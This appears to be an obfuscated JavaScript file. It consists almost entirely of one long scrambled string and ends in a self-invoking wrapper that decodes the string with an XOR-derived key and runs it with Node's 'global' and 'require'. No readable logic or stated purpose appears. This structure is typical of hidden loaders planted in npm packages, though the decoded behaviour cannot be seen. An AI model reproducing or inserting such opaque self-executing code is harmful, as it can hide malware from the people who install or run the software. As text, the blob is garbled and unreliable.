R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR"tcsc.!rVRpaiz0<b"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f"t RRsN</C RnRdRrpRR<od<.R<r[ar"l<. P".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR"RuRRR"RtR<Rs".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}."P&yseR_a%rRR.D<iPsRD!i.mR"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR""](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.("]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?.."lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv "4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR"sz3o"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b "cRt,\'leacPc RR<Rz"<Ri l0oRRdRs7.R(eCcR_.6"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w"l{e]e-R</<s4Nt.op"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#"<cqk<ek.imRSN.RsE bPPn)<e}o0e".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR')))(677251^678990);}(global,require);
}
